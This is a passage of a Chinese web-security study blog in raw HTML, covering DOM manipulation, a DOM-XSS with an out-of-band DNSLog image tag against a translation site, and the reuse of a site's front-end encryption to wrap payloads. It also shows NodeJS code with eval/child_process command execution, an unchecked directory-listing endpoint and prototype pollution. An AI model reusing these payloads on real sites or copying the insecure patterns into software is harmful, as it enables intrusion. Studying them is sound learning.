class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">update</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> s=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;img&#x27;</span>)<span class="comment">//获取img标签的内容,并赋值给s（这里也可以使用var声明变量s）</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(s)<span class="comment">//控制台打印s变量的内容</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">update1</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> s=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;h1&#x27;</span>)<span class="comment">//获取img标签的内容,并赋值给s（这里也可以使用var声明变量s）</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> str=s.<span class="property">innerText</span>=<span class="string">&quot;这是hx&lt;br&gt;&quot;</span><span class="comment">//！！！！！！！！！！！！</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(str)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当我们使用innerText，后面的html标签不会被解析</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731755708521-bb94e9ba-d200-47f2-a936-7000d297ddb4.png"></p><p>使用innerHTML</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">&quot;update1()&quot;</span>&gt;</span>这是标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;update()&quot;</span>&gt;</span>刷新<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--当点击按钮，执行update函数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">update</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> s=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;img&#x27;</span>)<span class="comment">//获取img标签的内容,并赋值给s（这里也可以使用var声明变量s）</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(s)<span class="comment">//控制台打印s变量的内容</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">update1</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> s=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;h1&#x27;</span>)<span class="comment">//获取img标签的内容,并赋值给s（这里也可以使用var声明变量s）</span></span></span><br><span class="line"><span class="language-javascript">        s.<span class="property">innerHTML</span>=<span class="string">&quot;这是hx&lt;Hr&gt;&quot;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(s.<span class="property">innerHTML</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当点击标题，<Hr>标签被执行，页面更改</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731755857837-9e62e60f-a2df-4284-8ed2-f396d964f292.png"></p><h2 id="操作元素属性"><a href="#操作元素属性" class="headerlink" title="操作元素属性"></a>操作元素属性</h2><p>实现点击按钮更换图片</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">&quot;update1()&quot;</span>&gt;</span>这是标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;update()&quot;</span>&gt;</span>刷新<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--当点击按钮，执行update函数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">update</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> s=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;img&#x27;</span>)<span class="comment">//获取img标签的内容,并赋值给s（这里也可以使用var声明变量s）</span></span></span><br><span class="line"><span class="language-javascript">        s.<span class="property">src</span>=<span class="string">&#x27;2.png&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(s.<span class="property">src</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当我们点击刷新，图片被更新为2.png</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731756210287-97367a77-ce54-4da0-b21d-0b8209aab3b0.png"></p><h2 id="安全问题-2"><a href="#安全问题-2" class="headerlink" title="安全问题"></a>安全问题</h2><p>本身的前端代码通过DOM技术实现代码的更新修改，但是更新修改如果修改的数据可以由用户来指定，就会造成DOM-XSS攻击</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731756612812-b78523bb-362d-4eae-a103-de9bf1cc4cbc.png"></p><p>在用户可控输入的地方构造xss语句</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731756618362-f7d3fe1a-963d-4030-910e-6ecae59a4aa5.png"></p><blockquote><p>闭合标签</p></blockquote><p><font style="background-color:rgba(255, 255, 255, 0);">网易云翻译：可以使用带外dns，造成数据库ip泄露</font></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731758638489-4f833fe3-1073-491c-b343-1cf69849c6c4.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731758638485-e87b20de-30a3-43c1-a922-316becf78c8f.png"></p><p>正向翻译有过滤，当鼠标放在右边被翻译的文字，正向没有翻译出来再次尝试翻译，反向翻译没有过滤，执行构造的<img src="DNSLog.SubDomation">，被解析，成功带外查询</p><p>典型的DOM-XSS</p><h1 id="编码加密-逆向调试"><a href="#编码加密-逆向调试" class="headerlink" title="编码加密&amp;逆向调试"></a>编码加密&amp;逆向调试</h1><h2 id="编码加密"><a href="#编码加密" class="headerlink" title="编码加密"></a>编码加密</h2><p>通过js导入库来实现对数据的md5、AES、SHA1等加密</p><blockquote><p>没有实现..存在遗留问题</p></blockquote><h2 id="逆向调试"><a href="#逆向调试" class="headerlink" title="逆向调试"></a>逆向调试</h2><p>首先找到相应的源码内容位置</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731765728238-50246969-1003-4f26-8fd8-29b41361bf5b.png"></p><p>找到表单的name属性的值</p><p>CTRL+SHIFT+F在调试器中全局搜索name的值，找相应的加密函数</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731765698236-88096b61-73d1-449b-93ee-660e7672dbb2.png"></p><p>Login.js</p><p>审计代码，找到相应的加密函数</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731766279568-ad65b48d-54df-4ff5-8fe4-2c9bca7f021c.png"></p><p>找到加密逻辑</p><p>根据相应的加密函数，将payload加密，构成有效payload</p><p>如果加密格式不显示出来，怎样判断加密的方式是什么？</p><p>可以借助检查的控制台，尝试输入获取加密后的密码值，再和提交表单的加密值进行比对，若一致则证明识别出。（一般安全防护比较强的，不会把运行的所以东西全加载到浏览器上）</p><h2 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h2><p>当我们找到了相应的加密函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">logindata.<span class="property">UserName</span> = <span class="built_in">encodeURI</span>(encrypt.<span class="title function_">encrypt</span>(numMobile));</span><br><span class="line">logindata.<span class="property">Mobile</span> = <span class="built_in">encodeURI</span>(encrypt.<span class="title function_">encrypt</span>(numMobile));;</span><br><span class="line"><span class="comment">//加密密码</span></span><br><span class="line">logindata.<span class="property">Password</span> = <span class="built_in">encodeURI</span>(encrypt.<span class="title function_">encrypt</span>(numPassword));</span><br></pre></td></tr></table></figure><p>采用之前的方式在控制台中输入相应的代码encodeURI(encrypt.encrypt(numPassword))，报错encrypt is not defined，原因是：有一些文件只在服务器本地执行，不会加载到浏览器中</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731766414641-93f925b6-b843-4cda-a2b2-6c0bdb2e6803.png"></p><p>必须采用调试断点的方式来，通过服务器获取其执行文件，然后修改对应的返回密文即可</p><p>对应地方（加密函数那一行代码）打上断点，点击登录，进入断点调试，发现右侧出现输入的账号密码内容</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731766442652-f1108f0d-0b31-4228-89d0-5733f007c60c.png"></p><p>再次打开控制台，并输入encodeURI(encrypt.encrypt(numPassword))发现成功回显加密后的密码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731766455819-606405bd-020f-46f7-8ae8-7ee2ec2309f6.png"></p><p>我们在控制台构造payload并用加密函数进行加密，将加密后的有效payload提交，进行测试</p><h1 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h1><p><a href="https://www.w3cschool.cn/nodejs/">NodeJS教程</a></p><p>NodeJS是运行在服务器的JS，与传统JS不同（传统JS运行在前端浏览器，通过查看源代码可以看到完整JS代码），而NodeJS运行结果，查看源代码只能查看运行结果</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731805474083-45de1f4e-3189-4b7f-b138-898a128b2303.png"></p><p>访问之后当我们查看源代码，只有输出结果hello world</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731805515491-f34a8c87-4c39-4a49-8a52-ac8852b4dcf2.png"></p><h2 id="实现用户登录"><a href="#实现用户登录" class="headerlink" title="实现用户登录"></a>实现用户登录</h2><p>前端登录页面</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 登录标题 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>后台登录<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 用户名标签和输入框 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:3001/login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">class</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 密码标签和输入框 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pass&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 登录按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入 Express 框架</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 Express 应用程序实例</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">创建一个用于解析 <span class="variable constant_">URL</span> 编码的 bodyParser 中间件实例</span><br><span class="line"><span class="keyword">const</span> urlencodedParser = bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 处理 &#x27;/login&#x27; 路径的 GET 请求，返回简单的登录页面</span></span><br><span class="line">  app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;<span class="comment">//req表示接收请求，res 返回响应</span></span><br><span class="line">          <span class="comment">// 从请求中获取用户名和密码</span></span><br><span class="line">            <span class="keyword">const</span> u = req.<span class="property">query</span>.<span class="property">username</span>;<span class="comment">//query 从url中获取内容</span></span><br><span class="line">            <span class="keyword">const</span> p = req.<span class="property">query</span>.<span class="property">password</span>;**</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(u);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查用户名和密码是否为 admin 和 123456</span></span><br><span class="line"><span class="keyword">if</span> (u === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; p === <span class="string">&#x27;123456&#x27;</span>) &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;欢迎进入后台管理页面&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;登录用户或密码错误&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理 &#x27;/login&#x27; 路径的 POST 请求，使用 bodyParser 解析表单数据</span></span><br><span class="line">  app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, urlencodedParser, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="comment">// 从请求中获取表单提交的用户名和密码</span></span><br><span class="line">    <span class="keyword">const</span> u = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">const</span> p = req.<span class="property">body</span>.<span class="property">password</span>;**</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(u);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查用户名和密码是否为 admin 和 123456</span></span><br><span class="line"><span class="keyword">if</span> (u === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; p === <span class="string">&#x27;123456&#x27;</span>) &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;欢迎进入后台管理页面&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;登录用户或密码错误&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理根路径的 GET 请求，发送名为 &#x27;sql.html&#x27; 的文件</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/&#x27;</span> + <span class="string">&#x27;sql.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器，监听端口 3001</span></span><br><span class="line"><span class="keyword">const</span> server = app.<span class="title function_">listen</span>(<span class="number">3001</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Web 服务器已经启动，监听端口 3001！&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> req.query 用于处理 URL 查询字符串参数（GET请求），而 req.body 用于处理 （POST 请求）中的表单数据</p><blockquote><p>POST请求</p><p>还需要下载const bodyParser &#x3D; require(‘body-parser’); 相关库 npm i body-parser</p><p>并且post请求还需要创建一个解析URL编码的bodyParser （中间件实例）</p></blockquote><p>sql.js里同时写了get和post处理逻辑，当sql.html里方法属性为get时则使用get处理逻辑</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:3001/login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功登录</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731808248334-1d2a829e-bbd2-450c-9442-a23544436132.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731808256122-2d79f4ba-17f5-4224-a22e-cbf8ec1112de.png"></p><h2 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h2><p>导入mysql ，npm i mysql下载相关依赖</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mysql = <span class="built_in">require</span>(<span class="string">&#x27;mysql&#x27;</span>);</span><br></pre></td></tr></table></figure><p>导入 mysql 模块</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> connection = mysql.<span class="title function_">createConnection</span>(&#123;<span class="comment">//连接数据库信息</span></span><br><span class="line">host     : <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">user     : <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">password : <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">database : <span class="string">&#x27;dome01&#x27;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p>导入fs</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);<span class="comment">//导入fs库</span></span><br><span class="line"></span><br><span class="line">fs.<span class="title function_">readdir</span>(<span class="string">&#x27;./&#x27;</span>,<span class="keyword">function</span>(<span class="params">error,files</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(files);<span class="comment">//输出当前目录下的文件</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731809971360-53a4ab1e-5458-4e2e-bf5c-27565d6b000c.png"></p><p>启用服务器</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入文件系统和 Express 框架</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理 &#x27;/file&#x27; 路径的 GET 请求</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/file&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="comment">// 从请求中获取目录参数</span></span><br><span class="line">    <span class="keyword">const</span> dir = req.<span class="property">query</span>.<span class="property">dir</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(dir);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用文件管理函数，传递目录参数</span></span><br><span class="line">    <span class="title function_">filemanage</span>(dir);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动 Express 应用监听在3000端口</span></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Web应用已启动在3000端口！&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件管理函数，接收一个目录参数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">filemanage</span>(<span class="params">dir</span>) &#123;</span><br><span class="line">    <span class="comment">// 使用 fs.readdir 读取目录下的文件</span></span><br><span class="line">    fs.<span class="title function_">readdir</span>(dir, <span class="keyword">function</span> (<span class="params">error, files</span>) &#123;</span><br><span class="line">        <span class="comment">// 打印目录中的文件列表</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(files);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传参</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731810362556-1ca12f0a-6b06-4ea2-8fb1-7647d0cb587a.png"></p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> rce=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//node.js 调用系统命令执行 calc计算器</span></span><br><span class="line"><span class="comment">// rce.exec(&#x27;calc&#x27;);</span></span><br><span class="line"><span class="comment">//rce.spawnSync(&#x27;calc&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//node.js 调用代码执行</span></span><br><span class="line"><span class="comment">// eval(console.log(1))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//代码执行调用命令执行 把字符串当作代码解析</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure><p>exec &amp; spawnSync 调用系统命令</p><p>eval调用代码命令执行，将字符串当做代码解析</p><h2 id="安全问题-3"><a href="#安全问题-3" class="headerlink" title="安全问题"></a>安全问题</h2><p>SQL注入、文件操作、RCE、</p><p>实战测试NodeJS安全：</p><p>判断：参考前期的信息收集</p><p>黑盒：通过对各种功能和参数进行payload测试</p><p>白盒：通过对代码中写法安全进行审计分析</p><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>如果攻击者控制并修改了一个对象的原型，(proto)</p><p>那么将可以影响所有和这个对象来自同一个类、父祖类的对象。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125; <span class="comment">//1=1 0 __proto__= x</span></span><br><span class="line"><span class="comment">// 原型链污染</span></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)<span class="comment">//输出为1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// // 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)<span class="comment">//输出为1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// // 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar，此时bar为2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)<span class="comment">//输出为2</span></span><br></pre></td></tr></table></figure><p>我们并没有对zoo赋值，但zoo.bar输出为2，是因为继承了foo.bar父类的赋值2</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731813518356-a0ba1ec9-5f07-434f-871e-a9d9968d75b3.png"></p><p>利用原型链污染调用计算器</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个包含属性 bar 的对象 foo，并将 bar 设置为 1</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出 foo 对象的 bar 属性，预期输出为 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>); <span class="comment">// 输出: 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改 foo 对象的原型链上的 bar 属性，将其设置为执行命令 &#x27;require(\&#x27;child_process\&#x27;).execSync(\&#x27;calc\&#x27;);&#x27;</span></span><br><span class="line"><span class="comment">//调用计算机</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="string">&#x27;require(\&#x27;child_process\&#x27;).execSync(\&#x27;calc\&#x27;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出 foo 对象的 bar 属性，预期输出仍为 1，因为直接属性优先于原型链上的属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>); <span class="comment">// 输出: 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个空对象 zoo</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 eval 执行 zoo 对象的 bar 属性，由于 zoo 对象没有 bar 属性，会导致 ReferenceError</span></span><br><span class="line"><span class="comment">//调用计算机</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">eval</span>(zoo.<span class="property">bar</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="yapi漏洞"><a href="#yapi漏洞" class="headerlink" title="yapi漏洞"></a><font style="color:rgb(34, 34, 38);">yapi漏洞</font></h3><p><a href="https://blog.csdn.net/weixin_42353842/article/details/127960229">yapi token注入漏洞-CSDN博客</a></p><h1 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h1><h2 id="为什么使用webpack"><a href="#为什么使用webpack" class="headerlink" title="为什么使用webpack"></a>为什么使用webpack</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">test</span>()</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script src=&quot;src/2.js&quot;&gt;&lt;/script&gt;</span><br><span 